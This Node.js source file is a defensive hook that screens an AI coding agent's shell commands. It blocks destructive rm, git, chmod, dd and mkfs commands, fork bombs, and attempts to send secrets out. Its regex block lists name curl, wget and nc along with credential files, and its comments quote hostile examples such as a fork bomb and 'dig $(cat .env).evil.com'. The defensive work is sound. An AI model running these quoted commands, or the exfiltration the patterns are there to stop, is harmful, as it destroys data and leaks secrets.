#!/usr/bin/env node
// Bash Firewall — PreToolUse hook (matcher: Bash)
// Blocks destructive commands, force pushes, exfiltration attempts.
// Output: {"decision":"block","reason":"..."} to block, or exit silently to allow.
//
// Install: copy to ~/.claude/hooks/ and add to settings.json
// Zero dependencies — Node.js built-ins only.

'use strict';

const PROTECTED_BRANCHES = (process.env.PROTECTED_BRANCHES || 'main,master').split(',').map(b => b.trim());

const SENSITIVE_FILE_PATTERNS = [
  /\.env\b/,
  /\bid_rsa\b/,
  /\bid_ed25519\b/,
  /\.pem$/,
  /\.key$/,
  /credentials\.json/,
  /\.secret[s]?\b/,
  /secret_key\.[\w]+/,
];

// ---------------------------------------------------------------------------
// Command normalization
// ---------------------------------------------------------------------------

/**
 * Strips line continuations (\\\n) and collapses runs of whitespace.
 */
function normalizeCommand(cmd) {
  return cmd
    .replace(/\\\n/g, ' ')     // line continuations
    .replace(/\s+/g, ' ')      // collapse whitespace
    .trim();
}

/**
 * Splits a command string on ;, &&, ||, | while respecting single/double quotes.
 * Returns an array of individual command strings.
 */
function splitCommands(cmd) {
  const parts = [];
  let current = '';
  let inSingle = false;
  let inDouble = false;
  let i = 0;

  while (i < cmd.length) {
    const ch = cmd[i];

    // Handle escape sequences
    if (ch === '\\' && i + 1 < cmd.length) {
      current += ch + cmd[i + 1];
      i += 2;
      continue;
    }

    // Track quote state
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      current += ch;
      i++;
      continue;
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
      current += ch;
      i++;
      continue;
    }

    // Only split when outside quotes
    if (!inSingle && !inDouble) {
      // Check for &&, ||
      if ((cmd[i] === '&' && cmd[i + 1] === '&') || (cmd[i] === '|' && cmd[i + 1] === '|')) {
        parts.push(current.trim());
        current = '';
        i += 2;
        continue;
      }
      // Check for ; or single |
      if (ch === ';' || ch === '|') {
        parts.push(current.trim());
        current = '';
        i++;
        continue;
      }
    }

    current += ch;
    i++;
  }

  if (current.trim()) {
    parts.push(current.trim());
  }

  return parts.filter(Boolean);
}

// ---------------------------------------------------------------------------
// Individual checks — each returns a reason string or null
// ---------------------------------------------------------------------------

/**
 * Blocks rm with both -r and -f flags targeting / or /*
 */
function checkDestructiveRm(cmd) {
  // Match rm commands with -rf or -r -f (in any order) targeting root
  if (!/\brm\b/.test(cmd)) return null;

  const hasRecursive = /\s-[a-zA-Z]*r[a-zA-Z]*\b/.test(cmd) || /\s--recursive\b/.test(cmd);
  const hasForce = /\s-[a-zA-Z]*f[a-zA-Z]*\b/.test(cmd) || /\s--force\b/.test(cmd);

  if (hasRecursive && hasForce) {
    // Check for root path targets
    if (/\s\/(\s|$|\*)/.test(cmd) || /\s\/\*/.test(cmd)) {
      return 'Blocked: rm -rf targeting root filesystem';
    }
    // H-5: Block rm -rf targeting home directory
    if (/\s~(\/|\s|$)/.test(cmd) || /\s\$HOME\b/.test(cmd)) {
      return 'Blocked: rm -rf targeting home directory';
    }
    // H-5: Block rm -rf targeting /home/ or /Users/ (all user directories)
    if (/\s\/home(\/|\s|$)/.test(cmd) || /\s\/Users(\/|\s|$)/.test(cmd)) {
      return 'Blocked: rm -rf targeting user directories';
    }
  }
  return null;
}

/**
 * Blocks force push to protected branches (main/master by default).
 */
function checkForceGitPush(cmd) {
  if (!/\bgit\s+push\b/.test(cmd)) return null;
  const hasForce = /\s--force\b/.test(cmd) || /\s-f\b/.test(cmd) || /\s--force-with-lease\b/.test(cmd);
  if (!hasForce) return null;

  for (const branch of PROTECTED_BRANCHES) {
    // H-4: Escape regex metacharacters in branch names to prevent ReDoS / bypass
    const escaped = branch.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    // "git push -f origin main" or "git push --force origin master"
    if (new RegExp(`\\b${escaped}\\b`).test(cmd)) {
      return `Blocked: force push to protected branch "${branch}"`;
    }
  }
  return null;
}

/**
 * Blocks git reset --hard.
 */
function checkHardReset(cmd) {
  if (/\bgit\s+reset\s+--hard\b/.test(cmd)) {
    return 'Blocked: git reset --hard can destroy uncommitted work';
  }
  return null;
}

/**
 * Blocks git clean -f (removes untracked files permanently).
 */
function checkGitClean(cmd) {
  if (/\bgit\s+clean\b/.test(cmd) && /\s-[a-zA-Z]*f/.test(cmd)) {
    return 'Blocked: git clean -f permanently removes untracked files';
  }
  return null;
}

/**
 * Blocks writes (redirects >, >>) to system directories.
 */
function checkSystemFileWrite(cmd) {
  const systemPaths = ['/etc/', '/usr/', '/System/', '/Library/'];
  // Look for redirect operators followed by system paths
  for (const sysPath of systemPaths) {
    const pattern = new RegExp(`>+\\s*${sysPath.replace('/', '\\/')}`);
    if (pattern.test(cmd)) {
      return `Blocked: redirect to system path ${sysPath}`;
    }
  }
  return null;
}

/**
 * Blocks chmod 777 recursive or on root paths.
 */
function checkDangerousChmod(cmd) {
  if (!/\bchmod\b/.test(cmd)) return null;

  const has777 = /\b777\b/.test(cmd);
  const hasRecursive = /\s-[a-zA-Z]*R[a-zA-Z]*\b/.test(cmd) || /\s--recursive\b/.test(cmd);
  const targetsRoot = /\s\/(\s|$)/.test(cmd);

  if (has777 && (hasRecursive || targetsRoot)) {
    return 'Blocked: dangerous chmod 777 (recursive or on root)';
  }
  return null;
}

/**
 * Blocks fork bombs: :(){ :|:& };: and common variants.
 */
function checkForkBomb(cmd) {
  // Classic bash fork bomb patterns
  if (/:\(\)\s*\{.*:\|:.*\}/.test(cmd)) {
    return 'Blocked: fork bomb detected';
  }
  // Function-based variants
  if (/\w+\(\)\s*\{.*\|\s*\w+\s*&/.test(cmd) && /\}\s*;?\s*\w+/.test(cmd)) {
    return 'Blocked: possible fork bomb detected';
  }
  return null;
}

/**
 * Blocks dd writing to block devices and mkfs commands.
 */
function checkDiskWiper(cmd) {
  // dd writing to /dev/*
  if (/\bdd\b/.test(cmd) && /if=\/dev\/(zero|random|urandom)/.test(cmd) && /of=\/dev\//.test(cmd)) {
    return 'Blocked: dd targeting block device (disk wipe)';
  }
  // mkfs on any device
  if (/\bmkfs\b/.test(cmd)) {
    return 'Blocked: mkfs can destroy filesystem data';
  }
  return null;
}

/**
 * Blocks curl/wget/nc posting sensitive files and common exfiltration bypass patterns.
 *
 * Known limitations:
 * - Cannot detect exfiltration via DNS tunneling (e.g., dig $(cat .env).evil.com)
 * - Cannot detect exfiltration via encoded variable expansion (e.g., eval "$encoded")
 * - Cannot detect exfiltration split across multiple separate commands
 * - Inline script detection (python3 -c, node -e) only checks for sensitive file refs,
 *   not arbitrary network calls within the script string
 */
function checkExfiltration(cmd) {
  const hasUploadTool = /\b(curl|wget|nc|ncat|netcat)\b/.test(cmd);

  // H-3: Detect piped exfiltration — cat <sensitive> | curl/wget/nc (across full command)
  if (hasUploadTool) {
    for (const pattern of SENSITIVE_FILE_PATTERNS) {
      if (pattern.test(cmd)) {
        const match = cmd.match(pattern);
        return `Blocked: potential exfiltration of sensitive file (matched: ${match[0]})`;
      }
    }
  }

  // H-3: Detect cat <sensitive> piped to network tool (checks across pipe boundaries)
  const fullNormalized = cmd;
  if (/\bcat\b/.test(fullNormalized) && /\|/.test(fullNormalized) && hasUploadTool) {
    for (const pattern of SENSITIVE_FILE_PATTERNS) {
      if (pattern.test(fullNormalized)) {
        const match = fullNormalized.match(pattern);
        return `Blocked: piped exfiltration of sensitive file (matched: ${match[0]})`;
      }
    }
  }

  // H-3: Detect encoded command execution — base64 decode piped to shell
  if (/\bbase64\b.*-d\b/.test(cmd) && /\|\s*(sh|bash|zsh)\b/.test(cmd)) {
    return 'Blocked: base64-decoded command execution (base64 -d | sh)';
  }

  // H-3: Detect inline script execution referencing sensitive files
  if (/\b(python3?|node)\s+(-c|-e)\b/.test(cmd)) {
    for (const pattern of SENSITIVE_FILE_PATTERNS) {
      if (pattern.test(cmd)) {
        const match = cmd.match(pattern);
        return `Blocked: inline script referencing sensitive file (matched: ${match[0]})`;
      }
    }
  }

  return null;
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

const ALL_CHECKS = [
  checkDestructiveRm,
  checkForceGitPush,
  checkHardReset,
  checkGitClean,
  checkSystemFileWrite,
  checkDangerousChmod,
  checkForkBomb,
  checkDiskWiper,
  checkExfiltration,
];

function runChecks(command) {
  const normalized = normalizeCommand(command);
  const subcommands = splitCommands(normalized);

  for (const sub of subcommands) {
    for (const check of ALL_CHECKS) {
      const reason = check(sub);
      if (reason) return reason;
    }
  }

  // H-3: Run exfiltration check against the full normalized command
  // so piped patterns (cat .env | curl ...) are detected across pipe boundaries
  const fullReason = checkExfiltration(normalized);
  if (fullReason) return fullReason;

  return null;
}

// Hook stdin handler
function main() {
  let input = '';

  // 3-second timeout — fail closed (block) for security (C-4 fix)
  const timeout = setTimeout(() => {
    process.stdout.write(JSON.stringify({
      decision: 'block',
      reason: 'Bash firewall timed out waiting for input — blocking as precaution',
    }));
    process.exit(1);
  }, 3000);

  process.stdin.setEncoding('utf8');
  process.stdin.on('data', (chunk) => { input += chunk; });
  process.stdin.on('end', () => {
    clearTimeout(timeout);

    try {
      const event = JSON.parse(input);
      const command = event?.tool_input?.command;

      if (!command) {
        process.exit(0); // No command to check — allow
      }

      const reason = runChecks(command);
      if (reason) {
        process.stdout.write(JSON.stringify({ decision: 'block', reason }));
      }
    } catch (err) {
      // Parse error — fail closed for security (C-3 fix)
      process.stdout.write(JSON.stringify({
        decision: 'block',
        reason: `Bash firewall failed to parse input: ${err.message}. Blocking as precaution.`,
      }));
    }

    process.exit(0);
  });
}

// Run as hook or export for testing
if (require.main === module) {
  main();
}

module.exports = {
  normalizeCommand,
  splitCommands,
  checkDestructiveRm,
  checkForceGitPush,
  checkHardReset,
  checkGitClean,
  checkSystemFileWrite,
  checkDangerousChmod,
  checkForkBomb,
  checkDiskWiper,
  checkExfiltration,
  runChecks,
  PROTECTED_BRANCHES,
  SENSITIVE_FILE_PATTERNS,
};
